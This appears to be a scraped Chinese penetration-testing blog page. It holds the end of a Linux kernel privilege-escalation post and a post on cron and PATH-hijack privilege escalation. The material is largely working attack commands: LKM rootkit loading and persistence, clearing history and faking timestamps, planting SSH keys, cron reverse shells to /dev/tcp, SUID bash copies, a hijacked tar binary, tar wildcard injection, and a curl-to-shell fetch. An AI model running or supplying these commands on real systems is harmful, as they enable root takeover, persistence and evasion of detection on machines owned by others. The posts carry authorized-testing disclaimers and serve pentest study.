+<h3 id="加载与持久化"><a href="#加载与持久化" class="headerlink" title="加载与持久化"></a>加载与持久化</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; insmod rootkit.ko                           <span class="comment"># 加载（需CAP_SYS_MODULE）</span></span><br><span class="line">lsmod | grep rootkit &amp;&amp; rmmod rootkit               <span class="comment"># 查看/卸载</span></span><br><span class="line"><span class="built_in">cp</span> rootkit.ko /lib/modules/$(<span class="built_in">uname</span> -r)/kernel/drivers/misc/  <span class="comment"># 持久化</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;rootkit&quot;</span> &gt;&gt; /etc/modules-load.d/system.conf &amp;&amp; depmod -a</span><br></pre></td></tr></table></figure>
+
+<h3 id="LKM使用场景与防御"><a href="#LKM使用场景与防御" class="headerlink" title="LKM使用场景与防御"></a>LKM使用场景与防御</h3><p><strong>适用场景</strong>：绕过EDR&#x2F;HIDS（ring3检测不到ring0操作）；隐藏进程&#x2F;文件&#x2F;网络连接；绕过SELinux&#x2F;AppArmor。</p>
+<p><strong>防御手段</strong>：<code>CONFIG_MODULE_SIG_FORCE</code>强制签名；Secure Boot；<code>echo 1 &gt; /proc/sys/kernel/lockdown</code>内核锁定；审计<code>insmod</code>&#x2F;<code>modprobe</code>系统调用。</p>
+<hr>
+<h2 id="九、内核安全防护绕过"><a href="#九、内核安全防护绕过" class="headerlink" title="九、内核安全防护绕过"></a>九、内核安全防护绕过</h2><h3 id="KPTI-SMEP-SMAP"><a href="#KPTI-SMEP-SMAP" class="headerlink" title="KPTI &#x2F; SMEP &#x2F; SMAP"></a>KPTI &#x2F; SMEP &#x2F; SMAP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">KPTI (页表隔离): 分离内核与用户态页表</span><br><span class="line">  → 绕过: 使用不依赖内核地址的exploit (如DirtyPipe/PwnKit)</span><br><span class="line"></span><br><span class="line">SMEP (禁止执行用户态代码): 内核态不能执行userspace代码</span><br><span class="line">  → 绕过: 全内核ROP/JOP链，或数据攻击原语</span><br><span class="line"></span><br><span class="line">SMAP (禁止访问用户态内存): 内核不能直接读写userspace</span><br><span class="line">  → 绕过: 使用copy_from_user/copy_to_user内核API</span><br></pre></td></tr></table></figure>
+
+<h3 id="SELinux-AppArmor-只读文件系统"><a href="#SELinux-AppArmor-只读文件系统" class="headerlink" title="SELinux &#x2F; AppArmor &#x2F; 只读文件系统"></a>SELinux &#x2F; AppArmor &#x2F; 只读文件系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getenforce &amp;&amp; aa-status     <span class="comment"># SELinux/AppArmor状态</span></span><br><span class="line">mount | grep <span class="string">&quot;ro,&quot;</span> &amp;&amp; mount -o remount,rw / 2&gt;/dev/null   <span class="comment"># 只读文件系统</span></span><br><span class="line">find / -writable -<span class="built_in">type</span> d 2&gt;/dev/null | <span class="built_in">head</span>               <span class="comment"># 寻找可写分区</span></span><br></pre></td></tr></table></figure>
+
+<p>SELinux Enforcing下DirtyCow写 <code>/etc/passwd</code> 会被阻止，但 <code>/etc/shadow</code> 通常不阻止；PwnKit受影响较小。</p>
+<h3 id="grsecurity-PaX"><a href="#grsecurity-PaX" class="headerlink" title="grsecurity &#x2F; PaX"></a>grsecurity &#x2F; PaX</h3><p>商业加固内核修补了大多数公开exploit。对策：转向非内核路径（SUID、sudo、cron、服务漏洞），或利用未受保护的设备文件与配置错误。</p>
+<hr>
+<h2 id="十、提权后操作"><a href="#十、提权后操作" class="headerlink" title="十、提权后操作"></a>十、提权后操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HISTFILE=/dev/null &amp;&amp; <span class="built_in">history</span> -c &amp;&amp; <span class="built_in">unset</span> HISTFILE  <span class="comment"># 清理命令历史</span></span><br><span class="line"><span class="built_in">shred</span> -zu /tmp/exploit /tmp/dirty*                          <span class="comment"># 删除exploit</span></span><br><span class="line"><span class="built_in">touch</span> -r /etc/issue /etc/passwd                             <span class="comment"># 重置文件时间戳</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /root/.ssh &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAA...&quot;</span> &gt;&gt; /root/.ssh/authorized_keys  <span class="comment"># SSH持久化</span></span><br><span class="line">(crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;*/5 * * * * bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&#x27;&quot;</span>) | crontab -</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>从2012年的Mempodipper到2022年的DirtyPipe，Linux内核攻击面从未消失。渗透测试人员的核心能力：</p>
+<ol>
+<li><strong>建立CVE-Exploit映射库</strong>，覆盖常见内核版本</li>
+<li><strong>掌握交叉编译</strong>，应对无编译环境的目标</li>
+<li><strong>理解每种exploit原语与限制</strong>，而非盲目运行</li>
+<li><strong>持续跟踪新CVE</strong>，内核提权领域迭代极快</li>
+</ol>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文仅供授权安全研究和渗透测试使用。读者须确保所有测试均在合法授权范围内进行。未经授权对计算机系统进行攻击可能触犯《刑法》第285条（非法侵入计算机信息系统罪）等相关法律，作者不对任何滥用行为承担法律责任。</p>
+<hr>
+<p><strong>参考文献</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://dirtycow.ninja/">DirtyCow CVE-2016-5195</a></li>
+<li><a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">DirtyPipe CVE-2022-0847 by Max Kellermann</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">PwnKit CVE-2021-4034 by Qualys</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.linuxkernelcves.com/">Linux Kernel CVEs</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit Database</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SQL-injection-time-based/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/SQL-injection-time-based/" class="post-title-link" itemprop="url">SQL 注入：时间盲注详解</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-01 08:00:00" itemprop="dateCreated datePublished" datetime="2024-10-01T08:00:00+08:00">2024-10-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>页面完全无差异时，时间盲注是最后的武器——用 sleep 延迟逐位猜解数据，SQLMap --technique=T 全自动化，以及手工构造时间延迟 payload。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/SQL-injection-time-based/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/MSSQL-CLR-Assembly-Privilege-Escalation/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/MSSQL-CLR-Assembly-Privilege-Escalation/" class="post-title-link" itemprop="url">MSSQL CLR 程序集利用 — 从数据库权限到命令执行</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-09-15T08:00:00+08:00">2024-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-04-20 08:00:00" itemprop="dateModified" datetime="2026-04-20T08:00:00+08:00">2026-04-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>MSSQL CLR 程序集提权全流程实战。通过 SQL Server CLR 集成功能，编译 .NET DLL 创建自定义存储过程，以 SQL Server 服务账户身份执行系统命令，实现从数据库权限到操作系统命令执行的权限提升。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/MSSQL-CLR-Assembly-Privilege-Escalation/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Linux-privesc-cron-path/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/Linux-privesc-cron-path/" class="post-title-link" itemprop="url">Linux提权：Cron计划任务与PATH劫持</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-09-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-09-15T08:00:00+08:00">2024-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Cron 是 Linux 定时任务的核心组件。Cron 的不当配置——脚本可写、相对路径滥用、通配符使用不当——往往成为本地提权的突破口。本文系统梳理 crontab 枚举、脚本覆盖、PATH 劫持、通配符注入、Systemd Timer 及 pspy 进程监控等提权技术。</p>
+<blockquote>
+<p><strong>免责声明：</strong> 本文所述技术仅供安全研究与授权测试使用，严禁非法用途。</p>
+</blockquote>
+<hr>
+<h2 id="一、Crontab-枚举"><a href="#一、Crontab-枚举" class="headerlink" title="一、Crontab 枚举"></a>一、Crontab 枚举</h2><p>拿到初始 Shell 后，首先应对目标的 Cron 配置进行全面枚举。</p>
+<h3 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 系统级 crontab 与 cron 目录</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">ls</span> -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户级 crontab</span></span><br><span class="line"><span class="built_in">ls</span> -la /var/spool/cron/</span><br><span class="line"><span class="built_in">ls</span> -la /var/spool/cron/crontabs/        <span class="comment"># Debian/Ubuntu</span></span><br><span class="line"><span class="built_in">cat</span> /var/spool/cron/* 2&gt;/dev/null</span><br><span class="line">crontab -l 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h3 id="一键枚举"><a href="#一键枚举" class="headerlink" title="一键枚举"></a>一键枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab 2&gt;/dev/null</span><br><span class="line"><span class="built_in">ls</span> -laR /etc/cron* 2&gt;/dev/null</span><br><span class="line"><span class="built_in">ls</span> -laR /var/spool/cron 2&gt;/dev/null</span><br><span class="line">find /etc/cron* /var/spool/cron -writable -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h3 id="LinPEAS-辅助"><a href="#LinPEAS-辅助" class="headerlink" title="LinPEAS 辅助"></a>LinPEAS 辅助</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、可写脚本覆盖攻击"><a href="#二、可写脚本覆盖攻击" class="headerlink" title="二、可写脚本覆盖攻击"></a>二、可写脚本覆盖攻击</h2><p>当 Cron 调用的脚本对当前用户具有写权限时，可直接篡改脚本内容获取高权限 Shell。</p>
+<h3 id="发现可写脚本"><a href="#发现可写脚本" class="headerlink" title="发现可写脚本"></a>发现可写脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find /etc/cron* /var/spool/cron -writable -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">grep -v <span class="string">&quot;^#&quot;</span> /etc/crontab 2&gt;/dev/null | awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> f; <span class="keyword">do</span></span><br><span class="line">    [ -w <span class="string">&quot;<span class="variable">$f</span>&quot;</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;[+] Writable: <span class="variable">$f</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="注入-Payload"><a href="#注入-Payload" class="headerlink" title="注入 Payload"></a>注入 Payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root每5分钟执行 /opt/backup.sh 且该文件可写</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /opt/backup.sh &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1</span><br><span class="line">EOF</span><br><span class="line"><span class="comment"># 或追加到末尾保留原有逻辑：</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1 2&gt;&amp;1 &amp;&#x27;</span> &gt;&gt; /opt/backup.sh</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、PATH-环境变量劫持（核心）"><a href="#三、PATH-环境变量劫持（核心）" class="headerlink" title="三、PATH 环境变量劫持（核心）"></a>三、PATH 环境变量劫持（核心）</h2><p>这是 Cron 提权中最经典的一类场景。Cron 执行任务时的环境变量与交互式 Shell 完全不同：默认 <code>PATH</code> 通常只有 <code>/usr/bin:/bin</code>，<strong>不包含当前目录</strong>。若 Cron 脚本使用了相对路径命令，且 PATH 中存在更靠前且可写的目录，即可劫持命令执行。</p>
+<h3 id="3-1-确认-Cron-的默认环境"><a href="#3-1-确认-Cron-的默认环境" class="headerlink" title="3.1 确认 Cron 的默认环境"></a>3.1 确认 Cron 的默认环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个临时 Cron 任务收集环境信息</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * env &gt; /tmp/cron_env.txt&#x27;</span> | crontab -</span><br><span class="line"><span class="comment"># 一分钟后查看</span></span><br><span class="line"><span class="built_in">cat</span> /tmp/cron_env.txt</span><br><span class="line"><span class="comment"># 典型输出：</span></span><br><span class="line"><span class="comment"># HOME=/root</span></span><br><span class="line"><span class="comment"># PATH=/usr/bin:/bin</span></span><br><span class="line"><span class="comment"># SHELL=/bin/sh</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-场景一：脚本-cd-到可写目录后执行相对命令"><a href="#3-2-场景一：脚本-cd-到可写目录后执行相对命令" class="headerlink" title="3.2 场景一：脚本 cd 到可写目录后执行相对命令"></a>3.2 场景一：脚本 cd 到可写目录后执行相对命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/crontab 条目：</span></span><br><span class="line"><span class="comment"># */1 * * * * root cd /opt/scripts &amp;&amp; ./cleanup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 /opt/scripts 可写</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /opt/scripts/cleanup.sh &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/rootshell &amp;&amp; <span class="built_in">chmod</span> u+s /tmp/rootshell</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x /opt/scripts/cleanup.sh</span><br><span class="line"><span class="comment"># 等待 Cron 执行后：/tmp/rootshell -p</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-场景二：脚本使用不带绝对路径的命令"><a href="#3-3-场景二：脚本使用不带绝对路径的命令" class="headerlink" title="3.3 场景二：脚本使用不带绝对路径的命令"></a>3.3 场景二：脚本使用不带绝对路径的命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /opt/backup.sh 由 root Cron 执行，内容：</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> /backup</span><br><span class="line">tar -czf data.tar.gz /home/user/data</span><br><span class="line"><span class="built_in">date</span> &gt;&gt; /var/log/backup.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># tar 和 date 均未使用绝对路径。</span></span><br><span class="line"><span class="comment"># 如果 PATH 中某个靠前的目录可写，即可劫持。</span></span><br><span class="line"><span class="comment"># 查找可写的、在 PATH 中的目录：</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span> | <span class="built_in">tr</span> <span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;\n&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> d; <span class="keyword">do</span></span><br><span class="line">    [ -w <span class="string">&quot;<span class="variable">$d</span>&quot;</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;[+] <span class="variable">$d</span> is writable&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 /usr/local/bin 可写，创建劫持文件：</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /usr/local/bin/tar &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/rootshell &amp;&amp; <span class="built_in">chmod</span> 4777 /tmp/rootshell</span><br><span class="line"><span class="comment"># 调用真正的 tar 保持功能正常</span></span><br><span class="line">/usr/bin/tar <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/tar</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-完整流程示例"><a href="#3-4-完整流程示例" class="headerlink" title="3.4 完整流程示例"></a>3.4 完整流程示例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Step 1: 枚举 Cron</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab &amp;&amp; <span class="built_in">cat</span> /opt/monitor/check.sh  <span class="comment"># 发现调用 ping（无绝对路径）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 检查可写路径</span></span><br><span class="line">find / -writable -<span class="built_in">type</span> d 2&gt;/dev/null | grep -E <span class="string">&quot;(bin|sbin|opt|usr/local)&quot;</span> | <span class="built_in">head</span> -10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: 创建劫持（假设脚本先 cd 入可写目录）</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /opt/monitor/ping &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/.rsh &amp;&amp; <span class="built_in">chmod</span> 4777 /tmp/.rsh; /bin/ping <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x /opt/monitor/ping</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: 提权</span></span><br><span class="line">/tmp/.rsh -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="PATH-劫持流程图"><a href="#PATH-劫持流程图" class="headerlink" title="PATH 劫持流程图"></a>PATH 劫持流程图</h3><pre class="mermaid">flowchart TD
+    A[Cron 任务触发] --> B{脚本命令<br/>使用绝对路径?}
+    B -->|是 /usr/bin/cmd| C[安全，无法劫持]
+    B -->|否 cmd / ./cmd| D{PATH中靠前位置<br/>有可写目录?}
+    D -->|否| E{脚本先cd到<br/>可写目录?}
+    E -->|否| F[无法通过PATH劫持]
+    D -->|是| G[在可写目录<br/>创建同名恶意文件]
+    E -->|是| G
+    G --> H[Cron以root执行恶意命令]
+    H --> I[获取root权限]</pre>
+
+<hr>
+<h2 id="四、通配符注入（Wildcard-Injection）"><a href="#四、通配符注入（Wildcard-Injection）" class="headerlink" title="四、通配符注入（Wildcard Injection）"></a>四、通配符注入（Wildcard Injection）</h2><p>当 Cron 脚本使用 <code>tar</code>、<code>rsync</code>、<code>chown</code> 等命令配合通配符 <code>*</code> 时，可利用文件名与命令参数冲突实现注入。</p>
+<h3 id="4-1-tar-通配符注入"><a href="#4-1-tar-通配符注入" class="headerlink" title="4.1 tar 通配符注入"></a>4.1 tar 通配符注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Cron 脚本：cd /var/backup &amp;&amp; tar -czf /backup/archive.tar.gz *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 /var/backup 目录中创建特殊文件名：</span></span><br><span class="line"><span class="built_in">cd</span> /var/backup</span><br><span class="line"><span class="built_in">touch</span> -- <span class="string">&quot;--checkpoint=1&quot;</span></span><br><span class="line"><span class="built_in">touch</span> -- <span class="string">&quot;--checkpoint-action=exec=sh /tmp/payload.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; /tmp/payload.sh &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/payload.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通配符 * 展开后 tar 命令实际为：</span></span><br><span class="line"><span class="comment"># tar -czf /backup/archive.tar.gz --checkpoint=1 --checkpoint-action=exec=sh /tmp/payload.sh ...</span></span><br><span class="line"><span class="comment"># tar 将 --checkpoint* 解析为参数，进而执行 payload.sh</span></span><br></pre></td></tr></table></figure>
+
